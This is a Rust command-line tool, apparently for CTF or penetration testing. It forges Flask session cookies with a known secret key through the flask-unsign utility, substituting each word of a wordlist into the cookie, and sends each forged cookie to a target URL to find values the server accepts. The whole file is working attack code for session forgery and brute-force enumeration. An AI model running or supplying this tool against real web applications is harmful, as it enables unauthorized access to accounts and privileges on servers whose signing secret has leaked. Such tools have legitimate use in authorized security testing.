use clap::Parser;
use reqwest::blocking::Client;
use reqwest::header::COOKIE;
use std::error::Error;
use std::fs;
use std::io::Read;
use std::process::Command;

fn sign_cookie(cookie: &str, secret: &str) -> Result<String, Box<dyn Error>> {
    let cookie = Command::new("flask-unsign")
        .args(["--sign", "--cookie", cookie, "--secret", secret])
        .output()?
        .stdout;
    Ok(String::from_utf8(cookie).unwrap())
}
fn main() -> Result<(), Box<dyn Error>> {
    let args = Args::parse();
    let wordlist = fs::read_to_string(args.wordlist)?;
    let mut matches = Vec::new();
    let client = Client::new();
    for word in wordlist.split('\n') {
        let cookie = &sign_cookie(&args.cookie.replace("changeMe", word), &args.secret)?;
        let cookie = &cookie[..cookie.len() - 1];
        let header = format!("session={cookie}");
        let mut response = client.get(&args.url).header(COOKIE, header).send()?;
        if !response.status().is_success() {
            continue;
        }
        let mut response_text = String::new();
        response.read_to_string(&mut response_text)?;

        if !response_text.contains(&args.failure_indicator) {
            if !args.multi {
                println!("Found: {word}");
                return Ok(());
            };
            matches.push(word)
        };
    }
    if !matches.is_empty() && args.multi {
        println!("Found matches:");
        for m in matches {
            println!("{m}");
        }
    } else {
        println!("No matches found!")
    }
    Ok(())
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// URL of the server
    #[arg(short, long)]
    url: String,
    /// Cookie
    #[arg(short, long)]
    cookie: String,
    /// Secret
    #[arg(short, long)]
    secret: String,
    #[arg(short, long)]
    /// Failure indicator, (what substring should be in the response for the value to be regarded as
    /// incorrect)
    failure_indicator: String,
    /// path to the wordlist
    #[arg(short, long)]
    wordlist: String,
    /// Run for the entirety of the wordlist
    #[arg(short, long, default_value_t = false)]
    multi: bool,
}
